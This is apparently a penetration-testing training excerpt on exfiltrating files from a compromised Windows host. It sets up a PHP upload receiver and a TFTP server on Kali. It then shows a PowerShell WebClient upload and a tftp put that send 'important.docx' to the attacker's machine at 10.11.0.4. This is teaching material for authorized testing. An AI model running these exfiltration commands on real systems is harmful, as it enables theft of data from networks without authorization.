# Windows Uploads

## Windows Uploads Using Windows Scripting Languages

In certain scenarios, we may need to exfiltrate data from a target network using a Windows client.

If outbound HTTP traffic is allowed we can create the following PHP script and save it as upload.php in our Kali webroot directory, /var/www/html:

```php
<?php
$uploaddir = '/var/www/uploads/';

$uploadfile = $uploaddir . $_FILES['file']['name'];

move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
```

Next, we must create the uploads folder and modify its permissions, granting the _www-data_ user ownership and subsequent write permissions:

```bash
kali@kali:/var/www$ sudo mkdir /var/www/uploads
kali@kali:/var/www$ ps -ef | grep apache
kali@kali:/var/www$ sudo chown www-data: /var/www/uploads
kali@kali:/var/www$ ls -la
```

With Apache and the PHP script ready to receive our file, we move to the compromised Windows host and invoke the UploadFile method from the System.Net.WebClient class to upload the document we want to exfiltrate, in this case, a file named important.docx:

```powershell
C:\Users\Offsec> powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')
```

## Uploading Files with TFTP

We first need to install and configure a TFTP server in Kali and create a directory to store and serve files. Next, we update the ownership of the directory so we can write files to it. We will run atftpd as a daemon on UDP port 69 and direct it to use the newly created /tftp directory:

```bash
kali@kali:~$ sudo apt update && sudo apt install atftp
kali@kali:~$ sudo mkdir /tftp
kali@kali:~$ sudo chown nobody: /tftp
kali@kali:~$ sudo atftpd --daemon --port 69 /tftp
```

The final command is similar to the one shown below:

```bash
C:\Users\Offsec> tftp -i 10.11.0.4 put important.docx
Transfer successful: 359250 bytes in 96 second(s), 3712 bytes/s
```
